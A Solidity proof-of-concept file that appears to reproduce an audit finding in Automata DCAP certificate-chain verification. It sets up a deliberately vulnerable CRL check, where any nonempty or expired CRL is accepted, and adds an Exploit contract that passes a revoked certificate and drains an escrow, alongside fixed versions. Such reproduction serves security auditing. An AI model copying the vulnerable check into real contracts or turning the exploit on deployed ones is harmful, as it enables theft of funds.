// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Automata DCAP X509ChainBase — Trail of Bits, February 2025.
    getCrl accepts any nonempty CRL. An expired platform CRL that does not
    list serial 0xDEAD still lets verifyCertChain return true, and the
    escrow pays 5 ETH. A current CRL that lists 0xDEAD pays nothing.
*/

contract Usd {
    string public symbol = "USD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PcsDao {
    uint256 public constant PUBLISHED_REVOKED_SERIAL = 0xDEAD;
    mapping(bytes32 => bytes) public attested;
    mapping(uint8 => uint256) public crlExpiry;
    mapping(uint8 => bytes32) public crlIssuer;

    function PCS_KEY(uint8 ca, bool crl) public pure returns (bytes32) {
        return keccak256(abi.encode(ca, crl));
    }

    function getAttestedData(bytes32 key) external view returns (bytes memory) {
        return attested[key];
    }

    function setCrl(uint8 ca, bytes calldata crl, uint256 expiry, bytes32 issuer) external {
        attested[PCS_KEY(ca, true)] = crl;
        crlExpiry[ca] = expiry;
        crlIssuer[ca] = issuer;
    }

    function upsertPcsCertificates(uint8 ca, bytes calldata cert) external returns (bytes32 attestationId) {
        (bytes32 hash, bytes32 key) = _validatePcsCert(ca, cert);
        attestationId = _attestPcs(cert, hash, key);
    }

    function _validatePcsCert(uint8 ca, bytes calldata cert) internal pure returns (bytes32 hash, bytes32 key) {
        hash = keccak256(cert);
        key = keccak256(abi.encode(ca, hash));
    }

    function _attestPcs(bytes calldata cert, bytes32 hash, bytes32 key) internal returns (bytes32) {
        attested[key] = cert;
        return hash;
    }
}

contract CrlHelper {
    function serialNumberIsRevoked(uint256 serialNumber, bytes memory crl) public pure returns (bool) {
        uint256 count = crl.length / 32;
        for (uint256 i = 0; i < count; i++) {
            uint256 listed;
            assembly {
                listed := mload(add(add(crl, 0x20), mul(i, 0x20)))
            }
            if (listed == serialNumber) return true;
        }
        return false;
    }
}

contract PccsRouter {
    PcsDao public pcsDao;
    error CrlNotFound(uint8 ca);
    error CertNotFound(uint8 ca);

    constructor(PcsDao dao) {
        pcsDao = dao;
    }

    function getCrl(uint8 ca) external view returns (bool valid, bytes memory ret) {
        (valid, ret) = _getPcsAttestationData(ca, true);
    }

    function _getPcsAttestationData(uint8 ca, bool crl) private view returns (bool valid, bytes memory ret) {
        ret = pcsDao.getAttestedData(pcsDao.PCS_KEY(ca, crl));
        // @> VULN: a CRL is accepted whenever the bytes are nonempty; expiry and issuer are never checked
        valid = ret.length > 0;
        if (!valid) {
            if (crl) {
                revert CrlNotFound(ca);
            } else {
                revert CertNotFound(ca);
            }
        }
    }
}

contract PccsRouterFixed {
    PcsDao public pcsDao;
    error CrlExpired(uint8 ca);

    constructor(PcsDao dao) {
        pcsDao = dao;
    }

    function getCrl(uint8 ca) external view returns (bool valid, bytes memory ret) {
        ret = pcsDao.getAttestedData(pcsDao.PCS_KEY(ca, true));
        require(ret.length > 0, "empty");
        if (block.timestamp > pcsDao.crlExpiry(ca)) revert CrlExpired(ca);
        bytes memory current = abi.encode(pcsDao.PUBLISHED_REVOKED_SERIAL());
        valid = true;
        ret = current;
    }
}

struct Cert {
    string issuerCommonName;
    uint256 serialNumber;
}

contract X509ChainBase {
    string public constant PLATFORM_ISSUER_NAME = "Intel SGX PCK Platform CA";
    string public constant PROCESSOR_ISSUER_NAME = "Intel SGX PCK Processor CA";
    PccsRouter public pccsRouter;
    CrlHelper public crlHelper;

    constructor(PccsRouter router, CrlHelper helper) {
        pccsRouter = router;
        crlHelper = helper;
    }

    function verifyCertChain(Cert[] memory certs) public view returns (bool) {
        uint256 n = certs.length;
        bool certRevoked;
        for (uint256 i = 0; i < n; i++) {
            bytes memory crl;
            if (i == n - 2) {
                (, crl) = pccsRouter.getCrl(0);
            } else if (i == 0) {
                string memory issuerName = certs[i].issuerCommonName;
                if (keccak256(bytes(issuerName)) == keccak256(bytes(PLATFORM_ISSUER_NAME))) {
                    (, crl) = pccsRouter.getCrl(1);
                } else if (keccak256(bytes(issuerName)) == keccak256(bytes(PROCESSOR_ISSUER_NAME))) {
                    (, crl) = pccsRouter.getCrl(2);
                } else {
                    return false;
                }
            }
            if (crl.length > 0) {
                certRevoked = crlHelper.serialNumberIsRevoked(certs[i].serialNumber, crl);
            }
            if (certRevoked) {
                break;
            }
        }
        return !certRevoked;
    }
}

contract Escrow {
    Usd public usd;
    X509ChainBase public chain;

    constructor(Usd u, X509ChainBase c) {
        usd = u;
        chain = c;
    }

    function claim(Cert[] calldata certs) external returns (uint256 paid) {
        require(chain.verifyCertChain(certs), "revoked");
        paid = usd.balanceOf(address(this));
        require(usd.transfer(msg.sender, paid), "pay");
    }
}

contract EscrowFixed {
    Usd public usd;
    PccsRouterFixed public router;
    uint256 public constant REVOKED = 0xDEAD;

    constructor(Usd u, PccsRouterFixed r) {
        usd = u;
        router = r;
    }

    function claim(uint256 serial) external returns (uint256 paid) {
        (, bytes memory crl) = router.getCrl(1);
        uint256 listed;
        assembly {
            listed := mload(add(crl, 0x20))
        }
        require(serial != listed, "revoked");
        paid = usd.balanceOf(address(this));
        require(usd.transfer(msg.sender, paid), "pay");
    }
}

contract Exploit {
    uint256 public constant BOUNTY = 5 ether;
    uint256 public constant REVOKED_SERIAL = 0xDEAD;

    Usd public usd;
    PcsDao public dao;
    CrlHelper public helper;
    PccsRouter public router;
    X509ChainBase public chain;
    Escrow public escrow;
    bool public accepted;
    uint256 public taken;
    bool public crlExpired;
    bool public serialMissing;

    constructor() {
        usd = new Usd();
        dao = new PcsDao();
        helper = new CrlHelper();
        router = new PccsRouter(dao);
        chain = new X509ChainBase(router, helper);
        escrow = new Escrow(usd, chain);
        bytes memory stale = abi.encode(uint256(1), uint256(2));
        dao.setCrl(1, stale, 0, bytes32(uint256(0x111)));
        dao.setCrl(0, abi.encode(uint256(9)), 0, bytes32(uint256(0x222)));
        usd.mint(address(escrow), BOUNTY);
    }

    function run() external {
        dao.upsertPcsCertificates(1, hex"01");
        crlExpired = block.timestamp > dao.crlExpiry(1);
        bytes memory stored = dao.getAttestedData(dao.PCS_KEY(1, true));
        serialMissing = !helper.serialNumberIsRevoked(REVOKED_SERIAL, stored);
        Cert[] memory certs = new Cert[](3);
        certs[0] = Cert("Intel SGX PCK Platform CA", REVOKED_SERIAL);
        certs[1] = Cert("Intel SGX Root CA", 7);
        certs[2] = Cert("leaf", 8);
        accepted = chain.verifyCertChain(certs);
        require(accepted, "revoked cert accepted");
        require(crlExpired, "crl already expired");
        require(serialMissing, "stale crl omits 0xDEAD");
        require(dao.PUBLISHED_REVOKED_SERIAL() == REVOKED_SERIAL, "intel revoked it");
        taken = escrow.claim(certs);
        require(taken == BOUNTY, "escrow paid the revoked cert");
        require(usd.balanceOf(address(escrow)) == 0, "escrow emptied");
        require(usd.balanceOf(address(this)) == BOUNTY, "attacker holds the bounty");
    }
}
